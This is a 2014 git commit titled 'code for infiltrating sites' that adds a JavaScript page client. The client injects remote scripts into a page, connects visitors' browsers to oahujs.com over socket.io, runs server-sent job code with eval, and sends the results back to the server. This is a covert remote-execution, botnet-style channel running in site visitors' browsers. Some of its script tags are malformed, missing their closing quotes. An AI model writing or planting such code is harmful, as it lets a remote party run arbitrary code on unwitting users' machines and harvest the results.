ccfb1a06c9b0802e5157dc235368e40251c51bcd
hrosenblume <hrosenblume@gmail.com>
2014-10-31 18:02:49 -0400

    code for infiltrating sites

---
+++ page-client/oahu-page-client-1.0.js
@@ -0,0 +1,11 @@
+var imported = document.createElement('script');
+imported.src = 'https://cdn.socket.io/socket.io-1.1.0.js';
+document.head.appendChild(imported);
+
+var imported = document.createElement('script');
+imported.src = 'http://code.jquery.com/jquery-1.11.0.min.js';
+document.head.appendChild(imported);
+
+var imported = document.createElement('script');
+imported.src = 'http://oahujs.com/code/page-client-body-1.0.js';
+document.head.appendChild(imported);
---
+++ page-client/page-client-body-1.0.js
@@ -0,0 +1,33 @@
+document.write('<script type="text/javascript" src="https://cdn.socket.io/socket.io-1.1.0.js></script>');
+document.write('<script type="text/javascript" src="http://code.jquery.com/jquery-1.11.0.min.js></script>');
+
+var socket = io("http://oahujs.com");
+var token = getRandomToken();
+
+socket.on('requestAuth', function(data) {
+    console.log("Authenticate");
+    socket.emit('sendAuth', {browserId: token})
+});
+socket.on('sendJob', function(job) {
+    console.log("Received job", job);
+
+    eval(job.func);
+    console.log(start);
+    start(job.params, function(entries) {
+        console.log(entries);
+        socket.emit('jobSuccess', {result: entries});
+    });
+
+});
+
+function getRandomToken() {
+    // E.g. 8 * 32 = 256 bits token
+    var randomPool = new Uint8Array(32);
+    crypto.getRandomValues(randomPool);
+    var hex = '';
+    for (var i = 0; i < randomPool.length; ++i) {
+        hex += randomPool[i].toString(16);
+    }
+    // E.g. db18458e2782b2b77e36769c569e263a53885a9944dd0a861e5064eac16f1a
+    return hex;
+}
